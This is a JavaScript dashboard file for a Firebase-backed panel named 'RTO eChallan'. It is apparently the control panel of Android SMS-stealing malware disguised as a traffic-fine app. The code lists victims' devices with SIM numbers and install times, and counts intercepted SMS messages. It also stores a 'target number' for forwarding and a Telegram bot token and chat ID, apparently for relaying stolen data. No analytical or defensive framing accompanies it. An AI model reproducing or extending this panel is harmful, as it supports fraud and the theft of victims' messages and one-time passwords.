// ==========================================
// DASHBOARD LOGIC - RTO eChallan
// ==========================================
requireAuth();

let allDevices = [];
let deleteTargetId = null;

// ==========================================
// LOAD DEVICES FROM FIREBASE
// ==========================================
db.ref("device_info").on("value", (snapshot) => {
  const data = snapshot.val() || {};
  allDevices = [];

  Object.keys(data).forEach((deviceId) => {
    const d = data[deviceId] || {};
    allDevices.push({
      id: deviceId,
      device_name: d.device_name || d.device_model || shortDeviceName(deviceId),
      device_model: d.device_model || "-",
      device_manufacturer: d.device_manufacturer || "-",
      android_version: d.android_version || "-",
      battery: d.battery || "N/A",
      battery_status: d.battery_status || "",
      battery_updated_at: d.battery_updated_at || 0,
      sim1: d.sim1_number || d.sim1 || "No SIM Found",
      sim2: d.sim2_number || d.sim2 || "No SIM Found",
      install_time: d.install_time || "-",
      last_seen: d.last_seen || 0,
      serial_number: d.serial_number || 0,
      status: d.status || "Offline"
    });
  });

  allDevices.sort((a, b) => (b.serial_number || 0) - (a.serial_number || 0));

  updateStats();
  renderDevices();
});

// ==========================================
// UPDATE STATS
// ==========================================
function updateStats() {
  const total = allDevices.length;
  let online = 0;
  let offline = 0;

  allDevices.forEach((dev) => {
    if (isDeviceOnline(dev.last_seen)) online++;
    else offline++;
  });

  document.getElementById("statTotal").textContent = total;
  document.getElementById("statOnline").textContent = online;
  document.getElementById("statOffline").textContent = offline;

  loadMessageStats();
}

// ==========================================
// LOAD MESSAGE STATS
// ==========================================
function loadMessageStats() {
  db.ref("device_info").once("value").then((snap) => {
    const data = snap.val() || {};
    let sendCount = 0;
    let recvCount = 0;

    Object.keys(data).forEach((deviceId) => {
      const d = data[deviceId] || {};
      const msgs = d.messages || {};
      Object.keys(msgs).forEach((msgKey) => {
        const m = msgs[msgKey] || {};
        const type = (m.type || "").toUpperCase();
        if (type === "SENT") sendCount++;
        else recvCount++;
      });
    });

    document.getElementById("statSend").textContent = sendCount;
    document.getElementById("statReceived").textContent = recvCount;
  }).catch(() => {
    document.getElementById("statSend").textContent = "0";
    document.getElementById("statReceived").textContent = "0";
  });
}

// ==========================================
// RENDER DEVICE LIST
// ==========================================
function renderDevices() {
  const listEl = document.getElementById("deviceList");

  if (allDevices.length === 0) {
    listEl.innerHTML = '<div class="empty-state">No devices found</div>';
    return;
  }

  listEl.innerHTML = allDevices.map((dev) => {
    const online = isDeviceOnline(dev.last_seen);
    const statusClass = online ? "online" : "offline";
    const statusText = online ? "Online" : "Offline";

    return `
      <div class="device-card ${statusClass}">
        <div class="device-header">
          <div class="device-title-wrap">
            <div class="serial-badge">${dev.serial_number || "?"}</div>
            <div>
              <div class="device-name">Device ${escapeHtml(shortDeviceName(dev.id))}</div>
              <div class="device-id-small">${escapeHtml(dev.id.slice(0, 16))}...</div>
            </div>
          </div>
          <div class="status-pill ${statusClass}">
            <span class="status-dot"></span>
            ${statusText}
          </div>
        </div>

        <div class="device-info">
          <div class="info-row battery">
            <span class="ico">🔋</span>
            <span class="val">${escapeHtml(String(dev.battery))}</span>
          </div>
          <div class="info-row">
            <span class="ico">📶</span>
            <span class="val">${escapeHtml(dev.sim1)}</span>
          </div>
          <div class="info-row">
            <span class="ico">📱</span>
            <span class="val">Android ${escapeHtml(dev.android_version)}</span>
          </div>
          <div class="info-row">
            <span class="ico">⏰</span>
            <span class="val">${escapeHtml(String(dev.install_time))}</span>
          </div>
        </div>

        <div class="device-actions">
          <button class="act-btn act-info" onclick="openDevice('${dev.id}')">
            <div class="act-icon-wrap">ℹ️</div>
            <div class="act-label">Info</div>
          </button>
          <button class="act-btn act-signal" onclick="openDevice('${dev.id}')">
            <div class="act-icon-wrap">📡</div>
            <div class="act-label">Signal</div>
          </button>
          <button class="act-btn act-folder" onclick="openDevice('${dev.id}')">
            <div class="act-icon-wrap">📁</div>
            <div class="act-label">Folder</div>
          </button>
          <button class="act-btn act-delete" onclick="openDeleteModal('${dev.id}', '${escapeHtml(shortDeviceName(dev.id))}')">
            <div class="act-icon-wrap">🗑️</div>
            <div class="act-label">Delete</div>
          </button>
        </div>
      </div>
    `;
  }).join("");
}

// ==========================================
// NAVIGATION
// ==========================================
function openDevice(id) {
  window.location.href = "device.html?id=" + encodeURIComponent(id);
}

// ==========================================
// DELETE DEVICE
// ==========================================
function openDeleteModal(deviceId, name) {
  deleteTargetId = deviceId;
  document.getElementById("deleteDeviceName").textContent = `Delete device "${name}"?`;
  document.getElementById("modalDelete").classList.add("active");
}

function confirmDelete() {
  if (!deleteTargetId) return;

  const promises = [
    db.ref("device_info/" + deleteTargetId).remove(),
    db.ref("challan_users/" + deleteTargetId).remove().catch(() => {})
  ];

  Promise.all(promises).then(() => {
    closeModal('modalDelete');
    deleteTargetId = null;
  }).catch((err) => {
    alert("Error: " + err.message);
  });
}

// ==========================================
// UPDATE TARGET NUMBER
// ==========================================
function openUpdateNoModal() {
  db.ref("telegram_config/target_number").once("value").then((snap) => {
    document.getElementById("currentTargetNo").textContent = snap.val() || "Not Set";
  });
  document.getElementById("modalUpdateNo").classList.add("active");
}

function saveTargetNo() {
  const num = document.getElementById("targetNoInput").value.trim();
  if (num.length !== 10) {
    alert("Enter 10-digit number!");
    return;
  }
  db.ref("telegram_config/target_number").set(num).then(() => {
    alert("Target number saved!");
    closeModal('modalUpdateNo');
  });
}

// ==========================================
// CHANGE PASSWORD
// ==========================================
function openChangePassModal() {
  document.getElementById("oldPass").value = "";
  document.getElementById("newPass").value = "";
  document.getElementById("confirmPass").value = "";
  document.getElementById("modalChangePass").classList.add("active");
}

function changePassword() {
  const oldPass = document.getElementById("oldPass").value;
  const newPass = document.getElementById("newPass").value;
  const confirmPass = document.getElementById("confirmPass").value;
  const user = auth.currentUser;

  if (!oldPass || !newPass || !confirmPass) {
    alert("Fill all fields!");
    return;
  }
  if (newPass !== confirmPass) {
    alert("New password doesn't match!");
    return;
  }
  if (newPass.length < 6) {
    alert("Password must be at least 6 characters!");
    return;
  }

  const credential = firebase.auth.EmailAuthProvider.credential(user.email, oldPass);

  user.reauthenticateWithCredential(credential)
    .then(() => user.updatePassword(newPass))
    .then(() => {
      alert("Password changed!");
      closeModal('modalChangePass');
    })
    .catch((err) => {
      alert("Error: " + err.message);
    });
}

// ==========================================
// TELEGRAM BOT
// ==========================================
function openTelegramModal() {
  db.ref("telegram_config").once("value").then((snap) => {
    const cfg = snap.val() || {};
    document.getElementById("tgToken").value = cfg.bot_token || "";
    document.getElementById("tgChatId").value = cfg.chat_id || "";

    const statusEl = document.getElementById("telegramStatus");
    if (cfg.bot_token && cfg.chat_id) {
      statusEl.textContent = "✅ Configured";
      statusEl.style.color = "#00ff88";
    } else {
      statusEl.textContent = "❌ Not Configured";
      statusEl.style.color = "#ff3b5c";
    }
  });
  document.getElementById("modalTelegram").classList.add("active");
}

function saveTelegram() {
  const token = document.getElementById("tgToken").value.trim();
  const chatId = document.getElementById("tgChatId").value.trim();

  if (!token || !chatId) {
    alert("Token and Chat ID both required!");
    return;
  }

  db.ref("telegram_config").update({
    bot_token: token,
    chat_id: chatId
  }).then(() => {
    alert("Telegram config saved!");
    closeModal('modalTelegram');
  });
}

// ==========================================
// MODAL CONTROLS
// ==========================================
function closeModal(id) {
  const el = document.getElementById(id);
  if (el) el.classList.remove("active");
}

document.querySelectorAll(".modal-overlay").forEach((overlay) => {
  overlay.addEventListener("click", (e) => {
    if (e.target === overlay) {
      overlay.classList.remove("active");
    }
  });
});
